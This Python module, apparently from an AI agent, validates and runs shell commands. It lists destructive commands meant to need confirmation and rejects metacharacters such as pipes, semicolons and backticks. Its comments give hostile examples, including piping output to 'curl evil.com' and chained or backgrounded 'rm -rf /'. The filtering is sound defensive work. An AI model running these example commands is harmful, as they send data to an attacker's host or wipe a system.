"""Shell command execution for RadSim Agent.

This module contains shell execution tools following RadSim principles.
"""

import os
import shlex
import subprocess

# Commands requiring explicit user confirmation
DESTRUCTIVE_COMMANDS = {
    "rm",
    "rmdir",
    "del",
    "unlink",
    "shred",  # Deletion
    "sudo",
    "su",
    "chown",
    "chmod",  # Privileged
    "mv",  # Moving (can overwrite)
    "git push",
    "git reset",
    "git rebase",  # Git destructive
    "npm publish",
    "pip upload",  # Publishing
    "docker rm",
    "docker rmi",  # Container deletion
    "kubectl delete",  # Kubernetes deletion
}


def validate_shell_command(command):
    """Validate shell command for security.

    Blocks shell metacharacters that enable injection attacks:
    - Semicolons, pipes, backticks, dollar signs
    - Command chaining (&&, ||), background execution (&)
    - Newlines, carriage returns, null bytes
    - Path traversal (..) anywhere in the command

    Args:
        command: Command string to validate

    Returns:
        Tuple of (is_valid, error_message)
    """
    if not command:
        return False, "Command cannot be empty"

    if not isinstance(command, str):
        return False, "Command must be a string"

    # Strip and check for whitespace-only input
    if not command.strip():
        return False, "Command cannot be empty"

    # ---------------------------------------------------------------
    # Phase 1: Check the RAW command string for dangerous characters.
    # This happens BEFORE shlex parsing so metacharacters inside
    # quotes are also caught (strict mode for CLI agent safety).
    # ---------------------------------------------------------------

    is_safe, rejection_reason = _check_for_dangerous_characters(command)
    if not is_safe:
        return False, rejection_reason

    # ---------------------------------------------------------------
    # Phase 2: Parse with shlex and validate the parsed tokens.
    # ---------------------------------------------------------------

    try:
        parts = shlex.split(command)
    except ValueError:
        return False, "Invalid command format"

    if not parts:
        return False, "Empty command"

    # Check for path traversal in ALL parts (including the command name)
    for part in parts:
        if ".." in part:
            return False, "Path traversal ('..') is forbidden in command"

    return True, None


def _check_for_dangerous_characters(command):
    """Check raw command string for shell metacharacters.

    Returns:
        Tuple of (is_safe, rejection_reason).
        is_safe is True if no dangerous characters found.
    """
    # Null bytes -- must check first since they can truncate strings
    if "\x00" in command:
        return False, "Null bytes are forbidden in commands"

    # Newlines and carriage returns -- command injection via line splitting
    if "\n" in command or "\r" in command:
        return False, "Newlines are forbidden in commands"

    # Semicolons -- command chaining: `echo hi; rm -rf /`
    if ";" in command:
        return False, "Semicolons are forbidden in commands (command chaining)"

    # Backticks -- command substitution: echo `whoami`
    if "`" in command:
        return False, "Backticks are forbidden in commands (command substitution)"

    # Dollar sign -- variable expansion ($VAR), substitution ($(cmd)), ${VAR}
    if "$" in command:
        return False, "Dollar signs are forbidden in commands (variable/command substitution)"

    # Pipes -- output redirection: `echo hi | curl evil.com`
    if "|" in command:
        return False, "Pipes are forbidden in commands (output redirection)"

    # Double ampersand -- conditional chaining: `echo ok && rm -rf /`
    if "&&" in command:
        return False, "Conditional chaining (&&) is forbidden in commands"

    # Double pipe -- conditional chaining: `false || rm -rf /`
    if "||" in command:
        return False, "Conditional chaining (||) is forbidden in commands"

    # Single ampersand at end -- background execution: `rm -rf / &`
    # Check for standalone & (not part of && which is already caught above)
    if "&" in command:
        return False, "Background execution (&) is forbidden in commands"

    return True, None


def run_shell_command(command, timeout=120, working_dir=None):
    """Execute a shell command.

    Args:
        command: Command to execute
        timeout: Timeout in seconds (default: 120)
        working_dir: Working directory (default: current)

    Returns:
        dict with success, stdout, stderr, returncode
    """
    is_valid, error = validate_shell_command(command)
    if not is_valid:
        return {"success": False, "error": error}

    try:
        # Determine shell based on platform
        if os.name == "nt":  # Windows
            shell_cmd = ["powershell", "-NoProfile", "-Command", command]
        else:  # Unix/Mac
            shell_cmd = ["bash", "-c", command]

        cwd = working_dir or os.getcwd()

        result = subprocess.run(shell_cmd, capture_output=True, text=True, timeout=timeout, cwd=cwd)

        # Truncate output if too large
        stdout = result.stdout
        stderr = result.stderr
        max_stdout = 50000
        max_stderr = 10000

        if len(stdout) > max_stdout:
            stdout = stdout[:max_stdout] + "\n... [Output truncated]"
        if len(stderr) > max_stderr:
            stderr = stderr[:max_stderr] + "\n... [Error output truncated]"

        return {
            "success": result.returncode == 0,
            "stdout": stdout,
            "stderr": stderr,
            "returncode": result.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"Command timed out after {timeout} seconds"}
    except Exception as error:
        return {"success": False, "error": str(error)}
